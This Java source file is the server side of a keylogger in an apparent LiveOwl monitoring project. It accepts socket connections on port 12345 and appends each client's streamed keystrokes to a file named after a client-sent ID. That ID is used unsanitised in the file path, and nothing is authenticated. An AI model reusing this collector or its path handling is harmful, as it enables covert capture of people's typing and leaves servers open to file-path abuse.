package com.server.liveowl.Keylogger;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.time.LocalDateTime;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.time.format.DateTimeFormatter;

public class ServerKeylogger implements Runnable {
    private static final int PORT = 12345;
    private static final String LOG_DIRECTORY = "E:\\Downloads\\LiveOwlServer\\src\\main\\java\\com\\server\\liveowl\\Keylogger\\";
    private static final int MAX_THREADS = 25;
    private final ExecutorService threadPool = Executors.newFixedThreadPool(MAX_THREADS);

public void run() {
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("ServerKeylogger đang lắng nghe ở cổng " + PORT);

            while (true) {
                Socket socket = serverSocket.accept();
                threadPool.submit(() -> handleClient(socket));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleClient(Socket socket) {
        String clientID = "";
        try (InputStream inputStream = socket.getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
            // Đọc ID của client
            clientID = reader.readLine();
            if (clientID == null) {
                System.out.println("Không nhận được ID client.");
                return;
            }
            String logFilePath = LOG_DIRECTORY + "/" + clientID + "_keylogs.txt";
            // Ghi dữ liệu vào file
            try (FileWriter writer = new FileWriter(logFilePath, true)) { // Mở file ở chế độ "append"
                String keyStroke;
                while ((keyStroke = reader.readLine()) != null) {
                    writer.write(keyStroke);
                    writer.flush();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                socket.close();
                System.out.println("Đã đóng kết nối client " + clientID);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}

